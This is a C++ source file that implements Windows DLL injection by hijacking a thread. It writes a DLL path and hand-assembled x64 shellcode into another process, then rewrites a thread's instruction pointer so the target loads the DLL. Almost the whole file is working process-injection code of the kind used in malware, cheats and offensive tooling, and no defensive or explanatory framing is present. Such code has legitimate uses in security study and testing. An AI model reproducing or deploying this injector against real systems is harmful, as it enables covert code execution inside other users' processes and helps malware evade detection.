#pragma comment(lib, "ntdll_x64.lib")

#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include "log.hpp"
#include "libs\ntdll.h"
#include <ntstatus.h>


typedef NTSYSCALLAPI
NTSTATUS
NTAPI
TNtQueryInformationThread(
    _In_ HANDLE ThreadHandle,
    _In_ THREADINFOCLASS ThreadInformationClass,
    _Out_writes_bytes_(ThreadInformationLength) PVOID ThreadInformation,
    _In_ ULONG ThreadInformationLength,
    _Out_opt_ PULONG ReturnLength
);

typedef bool (*t_LoadLibraryA)(char*);



/// <summary>
/// Builds the shellcode
/// </summary>
/// <param name="outBuffer">pointer to the to-be-populated buffer. Should be at least 128 bytes</param>
/// <param name="outBuffer">pointer to loadLibraryA function in remote process (as its in kernel32.dll its the same in all processes. So just take yours)</param>
/// <param name="pShellCode">pointer to allocated memory for shellcode</param>
/// <param name="pSavedEIP">pointer to saved EIP to continue seamlessly</param>
/// <returns>size of shellcode</returns>
size_t buildShellCode(char outBuffer[], size_t outBufferSize, DWORD64* pDllPath, DWORD64* pLoadLibraryA, DWORD64* pSavedEIP) {

    // Call LoadLibraryA using fastcall calling convention
    unsigned char ShellCode[52] = {
        0x48, 0x83, 0xEC, 0x04, // sub rsp, 4
        0xC7, 0x04, 0x24, 0xCC, 0xCC, 0xCC, 0xCC, // mov immediate to rsp
        0x48, 0x83, 0xEC, 0x04, // sub rsp, 4
        0xC7, 0x04, 0x24, 0xCC, 0xCC, 0xCC, 0xCC, // mov immediate to rsp        
        0x50, 0x52, 0x51,                                                    // push rax, push rdx, push rcx

        // Main code
        0x48, 0xB9,
        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,                      // mov rcx, <8-byte value> (DllPath)
        0x48, 0xB8,
        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,                      // mov rax, <8-byte value> (LoadLibraryA)
        0xFF, 0xD0,                                                          // call rax (indirect call to LoadLibraryA via rax)

        0x59, 0x5A, 0x58,                                                    // pop rcx, pop rdx, pop rax
        0xC3,                                                               // Return
        0x00,
    };

    // Populate shellcode with correct values
    // memcpy is taking care of BE -> LE conversion

    DWORD upperEIP = *pSavedEIP >> 32;
    DWORD lowerEIP = *pSavedEIP & 0xFFFFFFFF;

    memcpy_s(&ShellCode[7], 4,&upperEIP , 4);
    memcpy_s(&ShellCode[18], 4, &lowerEIP, 4);
    memcpy_s(&ShellCode[27], 8, pDllPath, 8);
    memcpy_s(&ShellCode[37], 8, pLoadLibraryA, 8);

    size_t shellcode_size = 52;


    memcpy_s(outBuffer, outBufferSize, ShellCode, shellcode_size);


    return shellcode_size;
}

bool ThreadHijack_LLAInjection(HANDLE hProcess, int pid, char dll_path[], HANDLE *hThread_out) {
    debug("Starting HijackThread Injection ...\n");


    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, pid);

    THREADENTRY32 eThread = { sizeof(THREADENTRY32) };
    eThread.dwSize = sizeof(THREADENTRY32);


    if (!Thread32First(hSnapshot, &eThread)) {
        error("Could not get first thread\n");
        return FALSE;
    }
    
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");

    if (!hNtdll) {
        error("Could not get ntdll.dll module handle\n");
        return FALSE;
    }

    // Either do this or directly call NtQueryInformationThread from included ntdll.lib
    auto _NtQueryInformationThread_a = (TNtQueryInformationThread*)GetProcAddress(hNtdll, "NtQueryInformationThread");



    if (!_NtQueryInformationThread_a) {
        error("Could not get NtQueryInformationThread\n");
        return FALSE;
    }

    // Get LoadLibraryA RVA
    HMODULE hKernel = GetModuleHandleW(L"kernel32.dll");

    if (!hKernel) {
        error("Could not open handel to kernel32.dll");
        return FALSE;
    }

    t_LoadLibraryA* pLoadLibraryA = (t_LoadLibraryA*)GetProcAddress(hKernel, "LoadLibraryA");


    // Write DLL path into process
    void* pDllPath = VirtualAllocEx(hProcess, NULL, strlen(dll_path), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pDllPath) {
        error("Could not allocate memory in remote process\n");
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, pDllPath, dll_path, strlen(dll_path), NULL)) {
        error("Failed to write dll path (%s) to allocated memory (0x%p)\n", dll_path, pDllPath);
        return FALSE;
    }


    // Iterate over all threads (Currently break after first one)
    do {
        if (eThread.th32OwnerProcessID != pid) continue;
        debug("Opening thread: %d\n", eThread.th32ThreadID);
        CONTEXT cCurrentThread = { sizeof(CONTEXT) };

        // This is extremely important
        cCurrentThread.ContextFlags = CONTEXT_CONTROL;
        HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, 0, eThread.th32ThreadID);

        if (!hThread) {
            error("Could not open handle to thread\n");
            continue;
        }

        *hThread_out = hThread;

        // Get thread context
        if (!GetThreadContext(hThread, &cCurrentThread)) {
            error("Could not get thread context for thread handle: %d; id: %d\n", hThread, eThread.th32ThreadID);
            continue;
        }

        debug("Successfully got thread context\n");


        THREAD_BASIC_INFORMATION tbi;


        NTSTATUS status = _NtQueryInformationThread_a(hThread, _THREADINFOCLASS::ThreadBasicInformation, &tbi, sizeof(tbi), nullptr);

        if (status < 0) {
            error("Could not query infromation thread\n");
            continue;
        }

        TEB* pTEB = (TEB*)tbi.TebBaseAddress;
        debug("teb address: 0x%p\n", pTEB);

        TEB teb = {};

        if (!ReadProcessMemory(hProcess, pTEB, &teb, sizeof(teb), NULL)) {
            error("Could not read TEB\n");
            continue;
        }

        PEB* pPEB = teb.ProcessEnvironmentBlock;


        PEB peb = { sizeof(PEB) };

        if (!ReadProcessMemory(hProcess, pPEB, &peb, sizeof(PEB), NULL)) {
            error("Could not read PEB\n");
            continue;
        }

        DWORD64 current_rip = cCurrentThread.Rip;

        debug("Saved RIP: 0x%p\n", current_rip);

        char shell_code[128] = { 0x0 };
        debug("Local shellcode at 0x%p\n", shell_code);
        int shell_code_size = sizeof(shell_code);
        debug("ShellCodeSize: %d\n", shell_code_size);
        
        size_t shellcode_size = 52;
        buildShellCode(shell_code, shell_code_size, (DWORD64*)&pDllPath, (DWORD64*)&pLoadLibraryA, &current_rip);


        void* pShellCode = VirtualAllocEx(hProcess, NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        debug("Allocated shellcode memory at 0x%x\n", pShellCode);

        if (!pShellCode) {
            error("Could not allocate shellcode memory in remote process\n");
            return FALSE;
        }

        if (!WriteProcessMemory(hProcess, pShellCode, shell_code, shellcode_size, NULL)) {
            error("Failed to write shellcode (%s) to allocated memory (0x%p)\n", shell_code, pShellCode);
            return FALSE;
        }

        debug("Wrote shellcode to 0x%p\n", pShellCode);



        cCurrentThread.Rip = (DWORD64)pShellCode;
        debug("Setting Rip to 0x%p\n", cCurrentThread.Rip);

       
        if (!SetThreadContext(hThread, &cCurrentThread)) {
            error("Could not set thread context\n");
            continue;
        }
        
        debug("Successfully updated thread context\n");
        
        break; // Break for testing purposes

    } while (Thread32Next(hSnapshot, &eThread));

    return TRUE;
}
